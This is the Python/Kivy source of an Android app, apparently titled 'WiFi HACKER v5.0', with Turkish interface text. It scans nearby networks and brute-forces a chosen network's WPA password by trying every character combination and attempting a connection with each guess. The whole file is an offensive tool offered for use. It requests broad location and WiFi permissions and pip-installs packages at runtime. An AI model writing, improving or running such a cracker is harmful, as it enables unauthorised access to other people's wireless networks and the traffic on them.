"""
LİDRAZE WiFi HACKER v5.0 - GERÇEK DENEME
- Tüm izinler
- WiFi tarama
- Karışık şifre üretir
- Sonsuz dener
- Bağlanmayı dener

Cr: @lidraze
"""

import subprocess, sys, os

def install():
    for pkg in ["kivy", "pyjnius"]:
        try:
            __import__(pkg)
        except:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

install()

import itertools, threading, time, string, random
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.utils import platform
from kivy.metrics import dp
from kivy.core.window import Window

Window.clearcolor = (0.04, 0.05, 0.08, 1)


class Hacker(App):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.running = False
        self.attempts = 0
        self.wm = None
        self.wifi_list = []
        self.found = None
        self.setup()

    def setup(self):
        if platform == 'android':
            try:
                from android.permissions import request_permissions, Permission
                from android import api_version
                
                perms = [
                    Permission.ACCESS_FINE_LOCATION,
                    Permission.ACCESS_COARSE_LOCATION,
                    Permission.ACCESS_WIFI_STATE,
                    Permission.CHANGE_WIFI_STATE,
                    Permission.ACCESS_NETWORK_STATE,
                    Permission.CHANGE_NETWORK_STATE,
                    Permission.INTERNET,
                ]
                if api_version >= 33:
                    perms.append("android.permission.NEARBY_WIFI_DEVICES")
                if api_version >= 29:
                    perms.append("android.permission.ACCESS_BACKGROUND_LOCATION")
                
                request_permissions(perms)
                
                from jnius import autoclass
                Context = autoclass('android.content.Context')
                Activity = autoclass('org.kivy.android.PythonActivity')
                WifiManager = autoclass('android.net.wifi.WifiManager')
                self.wm = Activity.mActivity.getSystemService(Context.WIFI_SERVICE)
                
                if not self.wm.isWifiEnabled():
                    self.wm.setWifiEnabled(True)
            except Exception as e:
                print(f"Setup fail: {e}")

    def build(self):
        main = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(6))
        
        main.add_widget(Label(
            text='[b]🔥 WiFi HACKER v5.0[/b]',
            font_size='20sp', markup=True,
            size_hint_y=None, height=dp(50),
            color=(1, 0.3, 0.3, 1)
        ))
        
        # Sekmeler
        tabs = BoxLayout(size_hint_y=None, height=dp(45), spacing=dp(5))
        self.btn_tab1 = Button(text='📡 TARA', background_color=(0, 0.6, 0.9, 1), background_normal='', on_press=lambda x: self.tab(1))
        self.btn_tab2 = Button(text='🔐 KIR', background_color=(0.3, 0.3, 0.3, 1), background_normal='', on_press=lambda x: self.tab(2))
        tabs.add_widget(self.btn_tab1)
        tabs.add_widget(self.btn_tab2)
        main.add_widget(tabs)
        
        self.content = BoxLayout(orientation='vertical')
        main.add_widget(self.content)
        
        # SCAN
        self.scan = BoxLayout(orientation='vertical', spacing=dp(5))
        self.wifi_lbl = Label(text='⚫ WiFi kontrol...', size_hint_y=None, height=dp(25), font_size='11sp', color=(0.8,0.8,0.9,1))
        self.scan.add_widget(self.wifi_lbl)
        self.scan.add_widget(Button(text='📡 TARA', size_hint_y=None, height=dp(50), background_color=(0,0.7,0.5,1), background_normal='', on_press=lambda x: self.do_scan()))
        
        sc = ScrollView()
        self.wifi_box = BoxLayout(orientation='vertical', size_hint_y=None, spacing=dp(4))
        self.wifi_box.bind(minimum_height=self.wifi_box.setter('height'))
        sc.add_widget(self.wifi_box)
        self.scan.add_widget(sc)
        
        # CRACK
        self.crack = BoxLayout(orientation='vertical', spacing=dp(5))
        
        self.crack.add_widget(Label(text='SSID:', size_hint_y=None, height=dp(18), font_size='11sp', color=(0.8,0.8,0.9,1)))
        self.ssid = TextInput(hint_text='WiFi adı', multiline=False, size_hint_y=None, height=dp(38), font_size='13sp', background_color=(0.1,0.15,0.2,1), foreground_color=(1,1,1,1))
        self.crack.add_widget(self.ssid)
        
        self.crack.add_widget(Label(text='Karakterler:', size_hint_y=None, height=dp(18), font_size='11sp', color=(0.8,0.8,0.9,1)))
        self.chars = TextInput(text='0123456789', multiline=False, size_hint_y=None, height=dp(38), font_size='10sp', background_color=(0.1,0.15,0.2,1), foreground_color=(1,1,1,1))
        self.crack.add_widget(self.chars)
        
        row = BoxLayout(size_hint_y=None, height=dp(38), spacing=dp(5))
        row.add_widget(Label(text='Min:', size_hint_x=None, width=dp(40), font_size='11sp', color=(0.8,0.8,0.9,1)))
        self.minl = TextInput(text='4', multiline=False, background_color=(0.1,0.15,0.2,1), foreground_color=(1,1,1,1))
        row.add_widget(self.minl)
        row.add_widget(Label(text='Max:', size_hint_x=None, width=dp(40), font_size='11sp', color=(0.8,0.8,0.9,1)))
        self.maxl = TextInput(text='8', multiline=False, background_color=(0.1,0.15,0.2,1), foreground_color=(1,1,1,1))
        row.add_widget(self.maxl)
        self.crack.add_widget(row)
        
        self.status = Label(text='⚫ Hazır', size_hint_y=None, height=dp(22), font_size='12sp', color=(0.6,0.6,0.6,1))
        self.crack.add_widget(self.status)
        
        self.count = Label(text='Deneme: 0', size_hint_y=None, height=dp(22), font_size='12sp', color=(0,0.83,1,1))
        self.crack.add_widget(self.count)
        
        self.start_btn = Button(text='🚀 BAŞLA', size_hint_y=None, height=dp(55), font_size='16sp', background_color=(0.9,0.2,0.2,1), background_normal='', on_press=self.toggle)
        self.crack.add_widget(self.start_btn)
        
        sc2 = ScrollView()
        self.logs = BoxLayout(orientation='vertical', size_hint_y=None, spacing=dp(1))
        self.logs.bind(minimum_height=self.logs.setter('height'))
        sc2.add_widget(self.logs)
        self.crack.add_widget(sc2)
        
        self.content.add_widget(self.scan)
        Clock.schedule_interval(self.update, 2)
        return main

    def tab(self, n):
        self.content.clear_widgets()
        if n == 1:
            self.content.add_widget(self.scan)
            self.btn_tab1.background_color = (0,0.6,0.9,1)
            self.btn_tab2.background_color = (0.3,0.3,0.3,1)
        else:
            self.content.add_widget(self.crack)
            self.btn_tab1.background_color = (0.3,0.3,0.3,1)
            self.btn_tab2.background_color = (0.9,0.2,0.2,1)

    def update(self, dt):
        if not self.wm: return
        try:
            if self.wm.isWifiEnabled():
                ssid = self.wm.getConnectionInfo().getSSID()
                if ssid and ssid != '<unknown ssid>':
                    self.wifi_lbl.text = f'🟢 Bağlı: {ssid.strip(chr(34))}'
                else:
                    self.wifi_lbl.text = '🟢 WiFi açık'
            else:
                self.wifi_lbl.text = '🔴 WiFi kapalı'
        except: pass

    def log(self, msg, color=(0.8,0.8,0.9,1)):
        def _a(dt):
            self.logs.add_widget(Label(text=msg, font_size='9sp', size_hint_y=None, height=dp(18), color=color, halign='left', valign='middle'))
            if len(self.logs.children) > 300:
                self.logs.remove_widget(self.logs.children[0])
        Clock.schedule_once(_a, 0)

    def do_scan(self):
        if not self.wm: return
        threading.Thread(target=self._scan, daemon=True).start()

    def _scan(self):
        try:
            if not self.wm.isWifiEnabled():
                self.wm.setWifiEnabled(True)
                time.sleep(2)
            self.wm.startScan()
            time.sleep(3)
            results = self.wm.getScanResults()
            self.wifi_list = []
            for r in results.toArray():
                ssid = r.SSID
                if not ssid or ssid == '<unknown ssid>': continue
                cap = str(r.capabilities) if r.capabilities else ""
                if "WPA3" in cap: sec = "WPA3"
                elif "WPA2" in cap: sec = "WPA2"
                elif "WPA" in cap: sec = "WPA"
                elif "WEP" in cap: sec = "WEP"
                else: sec = "Açık"
                self.wifi_list.append({"ssid": ssid, "level": r.level, "sec": sec})
            self.wifi_list.sort(key=lambda x: x["level"], reverse=True)
            Clock.schedule_once(lambda dt: self._show(), 0)
        except Exception as e:
            self.log(f'❌ {e}', (1,0.4,0.4,1))

    def _show(self):
        self.wifi_box.clear_widgets()
        if not self.wifi_list:
            self.wifi_box.add_widget(Label(text='📭 WiFi bulunamadı\nWiFi+Konum açık mı?', size_hint_y=None, height=dp(80), color=(1,0.6,0.2,1), halign='center'))
            return
        self.wifi_box.add_widget(Label(text=f'✅ {len(self.wifi_list)} WiFi', size_hint_y=None, height=dp(25), color=(0.2,0.9,0.4,1), font_size='12sp'))
        for w in self.wifi_list:
            card = BoxLayout(size_hint_y=None, height=dp(50), padding=dp(5), spacing=dp(3))
            card.add_widget(Label(text=f'[b]{w["ssid"]}[/b]\\n{w["sec"]} | {w["level"]}dBm', font_size='11sp', markup=True, color=(1,1,1,1), halign='left'))
            btn = Button(text='🔐 KIR', size_hint_x=None, width=dp(70), font_size='11sp', background_color=(0.9,0.2,0.2,1), background_normal='', on_press=lambda x, w=w: self.pick(w))
            card.add_widget(btn)
            self.wifi_box.add_widget(card)

    def pick(self, w):
        self.ssid.text = w["ssid"]
        self.tab(2)
        self.log(f'🎯 {w["ssid"]}', (0,0.83,1,1))

    def toggle(self, inst):
        if self.running:
            self.running = False
            self.start_btn.text = '🚀 BAŞLA'
            self.start_btn.background_color = (0.9,0.2,0.2,1)
            self.status.text = '⚫ Durduruldu'
            return
        
        ssid = self.ssid.text.strip()
        if not ssid:
            self.log('❌ SSID boş', (1,0.4,0.4,1))
            return
        try:
            mn = int(self.minl.text)
            mx = int(self.maxl.text)
        except:
            self.log('❌ Sayı gir', (1,0.4,0.4,1))
            return
        chars = self.chars.text.strip()
        if not chars:
            self.log('❌ Karakter boş', (1,0.4,0.4,1))
            return
        
        self.running = True
        self.attempts = 0
        self.found = None
        self.start_btn.text = '⏹ DURDUR'
        self.start_btn.background_color = (0.5,0.5,0.5,1)
        self.status.text = '🔥 Deneniyor...'
        self.status.color = (1,0.3,0.3,1)
        
        self.log(f'🎯 {ssid}', (0,0.83,1,1))
        self.log(f'📏 {mn}-{mx} | {len(chars)} karakter', (0,0.83,1,1))
        
        threading.Thread(target=self.worker, args=(ssid, mn, mx, chars), daemon=True).start()

    def worker(self, ssid, mn, mx, chars):
        total = sum(len(chars)**l for l in range(mn, mx+1))
        self.log(f'📊 {total:,} kombinasyon', (0,0.83,1,1))
        
        for length in range(mn, mx+1):
            if not self.running: break
            self.log(f'📏 {length} hane', (0.8,0.8,0.9,1))
            for combo in itertools.product(chars, repeat=length):
                if not self.running: break
                pwd = ''.join(combo)
                self.attempts += 1
                
                if self.attempts % 5 == 0:
                    Clock.schedule_once(lambda dt: setattr(self.count, 'text', f'Deneme: {self.attempts:,}'), 0)
                if self.attempts % 50 == 0:
                    self.log(f'🔍 {pwd}', (0.5,0.7,0.9,1))
                
                if self.try_conn(ssid, pwd):
                    self.found = pwd
                    self.running = False
                    self.log(f'✅✅ {pwd}', (0.2,0.9,0.4,1))
                    Clock.schedule_once(lambda dt: self.on_found_ui(), 0)
                    return
                time.sleep(0.3)
        
        if not self.found:
            self.log('❌ Bulunamadı', (1,0.4,0.4,1))
            Clock.schedule_once(lambda dt: self.on_nf_ui(), 0)

    def try_conn(self, ssid, pwd):
        try:
            if platform != 'android' or not self.wm: return False
            from jnius import autoclass, JavaException
            try:
                WC = autoclass('android.net.wifi.WifiConfiguration')
                c = WC()
                c.SSID = '"' + ssid + '"'
                c.preSharedKey = '"' + pwd + '"'
                nid = self.wm.addNetwork(c)
                if nid == -1: return False
                self.wm.disconnect()
                self.wm.enableNetwork(nid, True)
                self.wm.reconnect()
                time.sleep(2)
                info = self.wm.getConnectionInfo()
                if info.getSSID() and ssid in str(info.getSSID()):
                    return True
                try: self.wm.removeNetwork(nid)
                except: pass
                return False
            except JavaException:
                return False
        except: return False

    def on_found_ui(self):
        self.start_btn.text = '🚀 BAŞLA'
        self.start_btn.background_color = (0.9,0.2,0.2,1)
        self.status.text = f'✅ {self.found}'
        self.status.color = (0.2,0.9,0.4,1)
        self.count.text = f'Deneme: {self.attempts:,} ✓'

    def on_nf_ui(self):
        self.start_btn.text = '🚀 BAŞLA'
        self.start_btn.background_color = (0.9,0.2,0.2,1)
        self.status.text = '❌ Bulunamadı'
        self.status.color = (1,0.4,0.4,1)


if __name__ == '__main__':
    Hacker().run()
